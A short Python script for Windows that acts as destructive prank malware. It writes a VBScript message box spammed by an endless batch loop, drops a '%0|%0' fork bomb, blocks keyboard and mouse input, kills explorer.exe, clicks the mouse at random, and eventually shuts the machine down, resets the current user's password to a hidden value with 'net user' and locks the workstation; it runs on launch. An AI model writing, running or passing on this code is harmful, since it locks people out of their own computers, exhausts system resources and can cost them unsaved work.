import os
import getpass
import time
import random
from ctypes import *
from pynput.mouse import Button, Controller
from ctypes import *

mouse = Controller()
with open("ERROR.vbs", "w") as File:  # windows
    File.write("""
msgbox "你电脑炸了！！！"
""")
with open("run.bat", "w") as File:  # send Window
    File.write("""
:start
start ERROR.vbs
goto start
""")
with open("boom.bat", "w") as File:  # boom
    File.write("""
%0|%0      
""")


def main(t):
    lock = windll.LoadLibrary('user32.dll')  # load user32.dll
    lock.BlockInput(True)

    def fun(t):
        os.system("taskkill /f /im explorer.exe")  # off explorer
        try:
            while True:  # always run this code
                if t != 0:
                    t += 1  # Boom time
                mouse.move(random.randint(100, 110), random.randint(100, 110))
                mouse.click(Button.left, 1)  # mouse
                os.system("run.bat")  # send window
                time.sleep(0.01)  # wait 0.01 second
                lock.BlockInput(False)
                print(str(t))  # print the BoomTime
                if t < 40000:
                    os.system("boom.bat")
                if t == 0:  # It's Time To BOOM!!!
                    os.system("shutdown -p")  # shutdown
                    user32 = windll.LoadLibrary('user32.dll')
                    user_name = getpass.getuser()  # get username
                    os.system('net user %s %s' % (user_name, "meirenzhidaodemima"))
                    user32.LockWorkStation()  # Exit desktop
        except Exception as e:
            time.sleep(0.1)
            fun(t)

    fun(t)


main(-12000)
